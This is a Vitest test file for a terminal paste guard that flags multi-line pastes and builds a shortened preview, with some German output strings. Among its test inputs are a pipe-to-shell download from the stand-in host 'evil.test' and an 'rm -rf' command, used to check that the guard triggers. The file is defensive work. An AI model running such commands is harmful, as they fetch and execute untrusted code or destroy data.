import { describe, expect, it } from 'vitest'
import { pastePreview, pasteRunsLines } from './paste-guard'

describe('pasteRunsLines', () => {
  it('holds for text with a line break, a trailing one too', () => {
    expect(pasteRunsLines('cd /tmp\nrm -rf x', false)).toBe(true)
    expect(pasteRunsLines('curl evil.test | sh\r\n', false)).toBe(true)
  })

  it('fails for a single line', () => {
    expect(pasteRunsLines('git status', false)).toBe(false)
  })

  it('fails when the program takes the text as one paste (bracketed paste)', () => {
    expect(pasteRunsLines('a\nb', true)).toBe(false)
  })
})

describe('pastePreview', () => {
  it('shows the lines without the trailing break', () => {
    expect(pastePreview('a\r\nb\r\n')).toBe('a\nb')
  })

  it('cuts long lines and says how many lines more there are', () => {
    const text = Array.from({ length: 10 }, (_, i) => `Zeile ${i + 1}`).join('\n')
    expect(pastePreview(text).split('\n')).toEqual([
      'Zeile 1',
      'Zeile 2',
      'Zeile 3',
      'Zeile 4',
      'Zeile 5',
      'Zeile 6',
      'Zeile 7',
      'Zeile 8',
      '… und 2 weitere Zeilen',
    ])
    expect(pastePreview(`${'x'.repeat(130)}\ny`)).toBe(`${'x'.repeat(120)}…\ny`)
  })
})
